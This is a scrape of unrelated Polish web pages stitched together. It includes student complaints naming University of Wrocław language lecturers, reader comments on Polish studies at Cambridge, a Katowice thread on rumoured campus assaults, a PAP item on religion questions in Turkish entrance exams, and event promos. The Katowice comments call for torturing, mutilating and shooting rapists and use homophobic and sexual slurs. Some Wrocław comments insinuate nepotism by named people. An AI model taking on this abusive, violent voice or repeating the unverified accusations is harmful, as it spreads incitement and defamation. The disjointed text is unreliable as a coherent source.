              zgodnie z postanowieniami „Regulaminu korzystania z artykułów prasowych” i po wcześniejszym uiszczeniu należności, zgodnie z cennikiem.
            Dodajesz komentarz jako: Gość




 
Tytuł komentarza


Podpis


Komentarz


              Dodając komentarz, akceptujesz regulamin forum

Liczba znaków do wpisania: 

zaloguj się 
Dodajesz komentarz jako: Gość




 
Tytuł komentarza


Podpis


Komentarz


           Dodając komentarz, akceptujesz regulamin forum


zaloguj się 



prawo (gość)
                            19.03.14, 15:45:55


 
Zgłoś naruszenie treści              




                   / 4 



                   / 1 

Pani Bojarska z całym szacunkiem pomyliła kierunki na uczelni! W tym semestrze mam 5 poważnych egzaminów z całorocznych (a nawet półtorej rocznych) przedmiotów! A szanowna Pani wymyśla z lektoratu...rozwiń całośćPani Bojarska z całym szacunkiem pomyliła kierunki na uczelni! W tym semestrze mam 5 poważnych egzaminów z całorocznych (a nawet półtorej rocznych) przedmiotów! A szanowna Pani wymyśla z lektoratu na lektorat coraz to lepsze sposoby by zawalić nas słówkami. 
Na następną kartkówkę mamy już ponad 300słówek (1zajęcia) plus zapis fonetyczny wszystkich dotychczasowych wyrażeń. I nie interesuje jej, że nie studiujemy filologii angielskiej i że mamy wiele ważniejszych przedmiotów. 
Książek nie mamy - mamy uczyć się z tego co zapiszemy w ZESZYCIE (nie na kartkach, ale w zeszycie). Serio? Na studiach zaczynamy bawić się w przedszkole? Może jeszcze tornister nosić mamy? zwiń
stosunki międzynarodowe (gość)
                            27.02.14, 21:05:46


 
Zgłoś naruszenie treści              




 



 

właśnie dzisiaj prowadząca kazała kupić nam podręcznik wspomniany wyżej który kosztuje obecnie 80 zł!!!! dla większości z nas to bardzo duża kwota i niestać nas na to. kserować nie możemy bo prawa...rozwiń całośćwłaśnie dzisiaj prowadząca kazała kupić nam podręcznik wspomniany wyżej który kosztuje obecnie 80 zł!!!! dla większości z nas to bardzo duża kwota i niestać nas na to. kserować nie możemy bo prawa autorskie. jedyny przywilej to to że na kupno mamy 3 tygodnie żeby uzbierać. kto nie kupi nie ma zaliczenia bo nie może przyjść z kserówką . koszmar. nie stać mnie na to utrzymuję się ze stypendium a w biblioteco tego nie ma a po za tym nie wolno pisać po książkach wypożyczanych..zwiń
Studentka (gość)
                            08.03.12, 21:53:06


 
Zgłoś naruszenie treści              




                   / 48 



                   / 32 

Ale zanim opublikowały swoją książkę nie przeszkadzało im, że same kserowały książki innych autorów. No i tego już na pewno nie robiły na własny użytek, bo kserowały je dla wszystkich studentów.
Sprawiedliwy (gość)
                            03.07.11, 19:27:16


 
Zgłoś naruszenie treści              




                   / 66 



                   / 30 

Cała prawda o rektorze Marku Bojarskim
nlnlk (gość)
                            04.03.11, 23:52:06


 
Zgłoś naruszenie treści              




                   / 76 



                   / 45 

"Jezeli Pani czuje się poszkodowana to proszę pojsc do jednostek nadrzednych i złozyc swoje zasadne żale."
Czyli do ojca Pani Bojarskiej który jest najwyższą " jednostką nadrzędną"?
hej hej (gość)
                            24.10.10, 23:32:21


 
Zgłoś naruszenie treści              




                   / 12 



                   / 10 

hej hej
ona- świadek (gość)
                            21.06.10, 23:09:01


 
Zgłoś naruszenie treści              




                   / 14 



                   / 9 

Po pierwsze sprostowanie podręcznik nie kosztował 60 zł lecz 80 i to przy wielkiej łasce lektorek, które powiedziały, że specjalnie dla nas zamówily bo tak są na rynku po 110....ah jaka dobroć...na...rozwiń całośćPo pierwsze sprostowanie podręcznik nie kosztował 60 zł lecz 80 i to przy wielkiej łasce lektorek, które powiedziały, że specjalnie dla nas zamówily bo tak są na rynku po 110....ah jaka dobroć...na zajęciach piekło, w przeciągu ostatnich 4 tygodni 4 testy do zaliczenia, na każdych zajęciach po jednym, skargi na nie nie działają, bo jak się o nich szanowne Panie dowiedziały, to szybko nam kazały podpisać deklarację, że sie zgadzamy na ich metody prowadzenia zajęć (przed kolokwium do napisania oraz gdy miała podać wyniki z dwóch poprzednich...), no i nr z ostatnich zajęć, gdy miały być wpisy, nagle ni z gruchy, ni z pietruchy mgr Jankowska oświadczyła, że wszystkie nieobecności (wszystkie!) mają być zaliczone w ciągu 4 dni roboczych, a to suprise na koniec, żeby dowalić tym niewdzięcznym studentom, no bo my innych zaliczeń i egzaminów pewnie nie mamy, a ona lubi jak 200 osób stoi pod jej gabinetem, a ona ma konsultację przez półtora godz. Więc ja mówię AUT od nas z koszarowej, takich prowadzących, którzy mszczą sie na studentach nie chcemy, a władzę uczelni niech w końcu coś zrobią, a nie ciągle umywają ręce wobec skarg na Panią mgr Ewę Jankowską i Izabellę Bojarską, a tak propos rektor Uwr to Pan Marek Bojarski, hmmm zbieg okoliczności......................zwiń
student (gość)
                            17.06.10, 00:23:10


 
Zgłoś naruszenie treści              




                   / 13 



                   / 9 

Cytat:co za bzdura. nikt mnie do niczego nie zmusza. nie mam ksiazki, prowadze zeszyt i bez problemów zaliczam. studentka

cały wątek zaczęty od tego postu o tym samym IP co:
złodziejstwo...rozwiń całośćCytat:co za bzdura. nikt mnie do niczego nie zmusza. nie mam ksiazki, prowadze zeszyt i bez problemów zaliczam. studentka

cały wątek zaczęty od tego postu o tym samym IP co:
złodziejstwo xxz (83.18.88.xxx) 22.03.10, 12:49  złodziejstwo xxz (83.18.88.xxx) 22.03.10, 12:49 
O ile wiem to uczelnia nie zapewnia studentom podręczników (poza tymi dostępnymi w bibliotece), wiec chyba oczywiste jest ze trzeba je zakupic a nie ukrasc. 
cytuj odpowiedz 
 testy 007 (83.18.88.xxx) 22.03.10, 12:53  testy 007 (83.18.88.xxx) 22.03.10, 12:53 
Hiiiiii, hIIIIII. miłego pisania testów. Nie ma jak to wkurzyc wykładowce na poczatku semestru!!!!!!!
Hiiiiiiiiiii
Hiiiiiiiiiii 
cytuj odpowiedz 
 biedni studenci wrocek (83.18.88.xxx) 22.03.10, 12:59  biedni studenci wrocek (83.18.88.xxx) 22.03.10, 12:59 
A za co student ma kupic książkę? Przeciez ma wydatki: apartament na chronionym osiedlu, samochód, benzyna, bilety do kina, wyjscia do dyskoteki, hektolitry piwa i wina, papierosy, najnowsze modele telefonów komórkowych, laptopy. A stypendium naukowe wątpliwe jest bo wyniki w nauce niespecjalne. Wiec za co? Pytam się za co? 
cytuj odpowiedz 
 biedni studenci kiKK (83.18.88.xxx) 22.03.10, 13:05  biedni studenci kiKK (83.18.88.xxx) 22.03.10, 13:05 
Studenci maja bardzo roszczeniowa postawe, nie placa za studia, chca darmowych podręczników, długopisów, tasmy klejacej, keju, plakatowek, papieru kolorowego, zeszytow, zszywaczy, transportu miejskiego, kanapek w bufecie, mieszkan…
A nie wystarcza zasoby biblioteczne i papier w kiblu??? Chociaz podobno papier z kibla tez kradna

cytuj odpowiedz 
 idioci w ksero ABW (83.18.88.xxx) 22.03.10, 13:16  idioci w ksero ABW (83.18.88.xxx) 22.03.10, 13:16 
W ksero to tez idioci pracują. Nawet nie potrafią właściwego rozdziału z ksiażki skserowc. Kiedyś się pomylili, skserowli zły dla całej grupy. Prowadzacy się wkurzuł i walnął nam dwóje. 
cytuj odpowiedz 
 ksero zamiast biblioteki cik (83.18.88.xxx) 22.03.10, 13:22 

Widać mamy tu agenta ( lepiej agentkę) o 100 twarzach- podpisach!zwiń
student (gość)
                            17.06.10, 00:17:06


 
Zgłoś naruszenie treści              




                   / 14 



                   / 9 

Cytat:Hiiiiii,  hIIIIII. miłego pisania testów. Nie ma jak to wkurzyc wykładowce na poczatku semestru!!!!!!!
Hiiiiiiiiiii
Hiiiiiiiiiii
Ciekawe, że od tego postu 4 następne posty są napisane...rozwiń całośćCytat:Hiiiiii,  hIIIIII. miłego pisania testów. Nie ma jak to wkurzyc wykładowce na poczatku semestru!!!!!!!
Hiiiiiiiiiii
Hiiiiiiiiiii
Ciekawe, że od tego postu 4 następne posty są napisane z tego samego IP (ale mają inne nazwy), w krótkim odstępie czasu.!!!!!!!!
Chyba wiem, kto nas pozdrawia:)zwiń
studentka (gość)
                            17.06.10, 00:10:46


 
Zgłoś naruszenie treści              




                   / 14 



                   / 8 

To co działo się w czasie trwania tego semestru to skandal. Szanowana p.B. zmieniała kilka razy zdanie odnośnie zaliczenia, obecności... Zajęcia to 90 minut szukania słówek na czas w słowniku, cała...rozwiń całośćTo co działo się w czasie trwania tego semestru to skandal. Szanowana p.B. zmieniała kilka razy zdanie odnośnie zaliczenia, obecności... Zajęcia to 90 minut szukania słówek na czas w słowniku, cała reszta zadana została do domu. Na każdych zajęciach odnosiła się do nas w sposób karygodny. Mnie obraziła dodatkowo na konsultacjach- tak dla zabawy. Zadania na testach to jakieś zgadywanki, szukanie słówka- jak w krzyżówkach. Mimo znajomości wszystkich słówek z unitu- nie dało rady tego rozwiązać. Dla mnie te zajęca są jednym z głównych powodów odejscia z WNS-u, nie zniosę następnego semstru tego lektoratu. Szkoda, że petycja nic nie zmieniła.zwiń





tel.: 71 37 48 205
redakcja@gazeta.wroc.pltel.: 71 37 48 249
karolina.michalak@polskapress.plGazeta Wrocławska jest częścią:

Polska Press Sp. z o.o.
                 informuje, że wszystkie treści ukazujące się w serwisie Gazeta Wrocławska podlegają ochronie.
        Dowiedz się więcej.
        Jesteś zainteresowany kupnem treści? Dowiedz się więcej.
      © 2000 - 2018 Polska Press Sp. z o.o.Nie ma podstrony o podanym adresiePrzepraszamy, ale podsrtona o takim adresie nie istniejeInternational Collegiate Programming
		Contest - ICPC
			The ACM International Collegiate Programming Contest (ICPC) is a multitier, team-based, programming competition operating 
			under the auspices of ACM and headquartered at Baylor University. The contest involves a global network of universities 
			hosting regional competitions that advance teams to the ACM-ICPC World Finals. Participation has grown to several tens of 
			thousands of the finest students and faculty in computing disciplines at almost 3,000 universities from over 100 countries 
			on six continents. The contest fosters creativity, teamwork, and innovation in building new software programs, and enables 
			students to test their ability to perform under pressure. Quite simply, it is the oldest, largest, and most prestigious 
			programming contest in the world.
		Unlimited uploads. Unlimited space. Safeguard your high-res photos in the cloud.Uniwersytet Cambridge (fot. Andrew Dunn/ Creative Commons license)
			
			  teaforme
			
			

			Oceniono 19 razy

                              17
			





                        
                          
                          
                            Polska kultura, a w tym szczegolnie literatura i poezja jest nie tylko bogadsza, ale znacznie  dluzsza w swoim rozwoju w porownaniu z ukrainska, czy tez jej narzeczem moskalskim, W 15 16 czy 17 wieku, gdy j.polski byl obowiazkowym jezykiem klasy rzadzacej na wschod od Polski, w tym na Rusi i Muscovy, jej literatura  byla juz wtedyd bogata i szeroko rozpowszechniona w odroznieniu pd praktycznie nieistniejacej ruskiej czy tez moskalskiej.  Znajomosc  tworcza tak wielkich pisarzy i poetow jak Dantyszek,Janicki, Rey, Frych Modrzewski, Morsztyn, Kochanowski,  Klonowic Potocki i wiele innych jest rownie wazne dla kultury Europy jak "wielkich pisarzy i poetow na zachod od Polski. Polski obok czeskiego, to najbardziej powiazane z lacina jezyki slowianskie, sa nieodlaczna i wazna czesca  kultury zachodu.
                          
                        
                      Odpowiedz
			
			  eulalia11
			
			

			Oceniono 15 razy

                              15
			





                        
                          
                          
                            A ja uważąm, że to i miłe i dobre. W końcu uniwersytet znakomity więc bez komentarza.....
                          
                        
                      Odpowiedz
			
			  koniu150
			
			

			Oceniono 16 razy

                              10
			





                        
                          
                          
                            "Zajęcia ma przygotować Katedra Slawistyki, która prowadzi już wykłady m.in. z zakresu rusycystyki i ukrainistyki"

no zwłaszcza ukraina to jest potęga gospodarcza
                          
                        
                      Odpowiedz
			
			  avadoro
			
			

			Oceniono 6 razy

                              6
			





                        
                          
                          
                            Rektor Cambidge sir Leszek Borysiewicz:
pl.wikipedia.org/wiki/Leszek_Borysiewicz
www.admin.cam.ac.uk/offices/v-c/biography/
Odpowiedz
			
			  esteta50
			
			

			Oceniono 6 razy

                              6
			





                        
                          
                          
                            Mysle, ze  beda tam wreszcie studiowac polscy politycy, dziennikarze i obecni pseudocelebryci, aby nauczyc sie prawidlowego wyslawiania i wladeania jezykiem polskim. Bo dotychczas mówia po polsku gorzej niz obcokrajowcy.
                          
                        
                      Odpowiedz
			
			  power_ant
			
			

			Oceniono 5 razy

                              5
			





                        
                          
                          
                            @esteta50
Bardzo dobry pomysł, ale niestety, oni nie dostaną się na te studia, bo to i jakaś matura potrzebna oraz inne takie...
                          
                        
                      Odpowiedz
			
			  pregierz
			
			

			Oceniono 7 razy

                              5
			





                        
                          
                          
                            no i fajnie
                          
                        
                      Odpowiedz
			
			  savrin
			
			

			Oceniono 8 razy

                              4
			





                        
                          
                          
                            nie wierzę, że te wszystkie ociekające żółcią komentarze są wydawane z polskich krtani. To jacyś najemnicy są.
                          
                        
                      Odpowiedz
			
			  trurlafan
			
			

			Oceniono 4 razy

                              2
			





                        
                          
                          
                            @wolfukas: a ty polskim chamem. Sorry, że się unoszę, ale jak czytam wypociny porostów, które tylko chcą napluć komuś w twarz, to mnie otrząsa. Dlaczego to musi być takie typowo polskie?
                          
                        
                      Odpowiedz
Pokaż wszystkie komentarze
Aby ocenić zaloguj się lub zarejestrujXLogowanieNie masz jeszcze konta?Wybierz regionWybierz miasto
Autor: Michalina Bednarek
        Uwaga! Seria napadów na studentki w kampusie Śląskiego ... (© facebook)Masz zdjęcie do tego tematu?
    Uwaga! Seria napadów na studentki w kampusie Śląskiego Uniwersytetu Medycznego w Katowicach.
  Podziel się na TwitterzeSkomentujIndustriada 2018. Muzyka i warsztaty kreatywności w Muzeum Historii Katowic...Niedziela 10 czerwca 2018 - czy jest handlowa, czy z zakazem? [KALENDARZ...Metal Doctrine Festival - przeciw są proboszczowie i wojewoda. Czy KAT zagra...Dodaj zdjęcie do materiału.Aby wysłać zdjęcie musisz zgodzić się z poniższym warunkiem.pytanie 1: Bucefał to człowiek...
    Podane dane osobowe będą przetwarzane przez Polska Press Sp. z o.o. z siedzibą w Warszawie. Podanie danych jest dobrowolne.
  Pozostałe informacje na temat celu i zakresu przetwarzania danych osobowych oraz Twoich praw znajdziesz w regulaminie.
    Dodając komentarz akceptujesz regulamin.
  Zaloguj się / Zarejestruj się!
    Podane dane osobowe będą przetwarzane przez Polska Press Sp. z o.o. z siedzibą w Warszawie. Podanie danych jest dobrowolne.
  Pozostałe informacje na temat celu i zakresu przetwarzania danych osobowych oraz Twoich praw znajdziesz w regulaminie.
    Dodając komentarz akceptujesz regulamin.
  Zaloguj się / Zarejestruj się!
        ha. Mówiłam, że to plotki!! http://www.dziennikzachodni.pl/artykul/489615,katowice-gwalciciela-na-ligocie-nie-ma-ale-policja-wzmacnia,id,t.html      
        netka - po twojej interpunkcji, "hujowej" znajomości ortografii. oraz agresji, wnoszę że to ty jesteś gwałcicielem, który odgrzewa temat bo już lekko przycichł...

to bardzo typowe u psychicznych zboczeńców - jarać się swoją sławą.

lecz się.      
        niesprawiedliwe. rzeczywiscie ci ktorzy twierdza ze na gwalt mial znaczenie ubior to powinien sie leczyc bo niema dobrze pod kopula i sam jest psychiczny tez zapewne same niedaja to by niebylo gwaltow niesprawiedliwie osadzaja ofiary i to tez jest jest chore niewiem z kad takie osoby maja takie podejscie do sprawy ja nigdy nikomu tego niezycze ale coponiektorym by sie przydalo np. takiemu co mysli ze prowokuja ubiorem jeszcze w zime jak ja bym mogla takich ukarac to bym chetnie sama takim kare wymierzyla jak zlapia tych bydlakow to powinni oddac w receofiar oczywiscie zwiazanych i pod kontrola a te niech zrobia znimi co zechca niech zdychaja huja im podciac kwasem lac i te same tortury co oni stosuja wprowadzcie taka procedure to gwacicieli ubedzie.      
        tutaj więcej info. http://www.wykop.pl/ramka/977493/brutalne-gwalty-w-katowicach-i-zmowa-milczenia/      
        do ortodox. ubierz się w eleganckie firmowe ciuszki niech cię przeleci jakiś pedałek też powiemy ze sprowokowałeś go ubraniem albo sam masz popęd seksualny do facetów :D , a na drugi raz jak coś napiszesz kolejną bzdurę to to przemyśl ;) a co do tego gwałtu to normalnie szok zawsze tu było tak spokojnie teraz nawet dochodzi do ciągłych włamań do samochodów ale policja o tym też nie wspomina to normalnie jakaś plaga psychopatów.      
        ci co myślą że to plotki !. To wcale nie są plotki moja z sąsiadka rozmawiała z dzielnicowym naprawdę doszło do gwałtu więc nie mówcie że to plotki jeżeli nie mieszkacie tutaj ! :| a co bym zrobił z gwałcicielem... hmm ręce obciąć, zamknąć go w klatce i dać tabletki na popęd seksualny :D sam by się chyba zabił :D jeżeli to nie pomoże to klasyk pod ścianę i w łeb.      
        zmartwiony. a tak w ogóle, widział ktoś Krzyśka?      
        ty świnio. dziewczyna została znaleziona pobita i zgwałcona, potwierdza to policja. Co cie popycha do kwestionowania faktów? Chyba tylko to że jesteś sprawcą.      
        skoncz juz koles szczekac i oskarzac kazdego o gwalty.. jak ci zle z aktualna sytuacja to idz sam na parking pilnowac, albo petycje do UM pisz o oswietlenie i kamery.

dupe plaszczysz przed tym swoim komputerkiem i kazdego obrazasz kretynie.      
        pogrązaj sie dalej. gwałcicielu.      
        A po co. przecież taki gwałciciel mógłby uderzyć policjanta ,a on przecież chce iść po 15-tu latach na emeryturkę i nie będzie się narażał
a władze uczelni pewno by zareagowały gdyby gwałcono profesorki ,a studentki?-przecież jest ich dużo      
        realista - bądz realistą. przecież w internecie piszą że gwałcą - to gwałcą.

internet nie kłamie. a już na pewno nie facebook.

dobrze że są ludzie z postawą Pawła. na pewno lepiej ukamienować jednego czy dwóch - poczujemy się bezpieczniej.      
        a ja myślę, że to plotki.... Wiele krąży legend miejskich: seryjny morderca w okolicach stawu przy Wczasowej i Ślepiotki (plotka sprzed ok. 10-12 lat); mordowanie na narządy (Zabrze, jakieś 3 lata temu); porywanie małych dzieci w centrach handlowych....
Ludzie, przecież tam jest kilka szpitali: nie trzeba więc wiele, by JAKAŚ ofiara gwałtu tam trafiła (nawet i z innej części miasta)... Poza tym - pobicie tak ciężkie, że ofiara trafia na OIOM to sprawa dla prokuratora - a to już samo przez się wymusza przepytywanie świadków itd. ...
Większość doniesień to facebook i sformułowania "podobno", "chyba", "poczta pantoflowa"..
Na stronie policji nic na temat gwałtów nie ma. Dzwoniłam na komendę - powiedziano, że żadnych zgłoszeń gwałtu nie ma. To jak to jest? Że niby spisek?      
        paweł - zapraszam na kozetkę.... wygadaj sie jeszcze co ci lezy na sercu      
        .... Samson tez zapraszał na kozetkę... i tak będziesz siedział i miał co wieczór duzo obcych pał w swoim tylku, jeśli tak podnieca cie gwałt, ty reakcyjna gnido.      Industriada 2018. Muzyka i warsztaty kreatywności w Muzeum Historii Katowic...Polska Press sp. z.o.o informuje, że wszystkie treści ukazujące się w serwisie naszemiasto.pl podlegają ochronie.
            Dowiedz się więcej.
            Jesteś zainteresowany kupnem treści? Dowiedz się więcej.
          
              © 2000-2018 Polska Press Sp. z o.o.
W przyszłym roku tureckie uniwersytety wprowadzą w czasie egzaminów wstępnych pytania dotyczące religii - poinformowały we wtorek źródła oficjalne. Krytycy twierdzą, że to naruszenie zasady laickości obowiązującej w tym muzułmańskim kraju.
	W ramach reformy kandydaci będą musieli odpowiedzieć na pięć pytań dotyczących religii w czasie egzaminu wstępnego, zaplanowanego na 24 marca - wyjaśnił przedstawiciel ośrodka egzaminacyjnego, który podlega ministerstwu edukacji.
	Osiem pytań dotyczących tematyki religijnej znajdzie się również na egzaminie państwowym dla studentów nauk społecznych, planowanym na 15 czerwca 2013 roku.
	W publicznych szkołach w Turcji jest obowiązkowy kurs religii.
	W lutym premier Recep Tayyip Erdogan oświadczył, że jego islamsko-konserwatywny rząd chciałby "edukować młodzież w duchu religii". Wywołało to protesty części Turków, przywiązanych do zasady świeckości państwa wprowadzonej przez twórcę współczesnego państwa tureckiego Kemala Ataturka.
	Erdogan, którego Partia Sprawiedliwości i Rozwoju jest u władzy od 2002 roku, sam ma dyplom szkoły islamskiej. Opozycja stale zarzuca szefowi rządu zamiar islamizacji społeczeństwa, wskazując m.in. na ograniczenia sprzedaży alkoholu obowiązujące w niektórych miastach i w wielu restauracjach.
	Inna reforma wprowadzona w tym roku przez rząd Erdogana umożliwiła przedkładanie dyplomów szkół religijnych w czasie egzaminów na uniwersytety, podczas gdy wcześniej było to możliwe tylko w przypadku studiów teologicznych.

PAP


			Ze względów bezpieczeństwa, kiedy korzystasz z możliwości napisania komentarza lub dodania intencji,
			w logach systemowych zapisuje się Twoje IP. Mają do niego dostęp wyłącznie uprawnieni administratorzy systemu.
			Administratorem Twoich danych jest Instytut Gość Media, z siedzibą w Katowicach 40-042, ul. Wita Stwosza 11.
			Szanujemy Twoje dane i chronimy je. Szczegółowe informacje na ten temat oraz i prawa, jakie Ci przysługują, opisaliśmy w 
			Polityce prywatności.
			

Pobieranie listy
Copyright © Instytut Gość Media. Wszelkie prawa zastrzeżone.
		Juwenalia UEK to największe studenckie święto. Co roku w trakcie koncertu na Kampusie UEK grają dla Was światowej sławy wykonawcy. W ubiegłych latach na naszej scenie występowały takie gwiazdy jak: Sigma, Duke Dumont, Parov Stelar, Hadouken, Taco Hemingway, Ten Typ Mes, Netsky, Brodka, Gooral, O.S.T.R. czy Grubson.A poza tym X-tremalia, Noc Kinowa, Przegląd Kapel Rockowych… i wiele innych juwenaliowych projektów. Nie może Was tu zabraknąć!Piąta Gwiazda - Juwenalia UEK 2018Czwarta Gwiazda - Juwenalia UEK 2018Czwarta Gwiazda - Juwenalia UEK 2018Trzecia Gwiazda - Juwenalia UEK 2018Druga Gwiazda - Juwenalia UEK 2018Pierwsza Gwiazda - Juwenalia UEK 2018Gwiazdy Wyborów Najmilszych 2018Gwiazda Przeglądu Kapel Rockowych 2018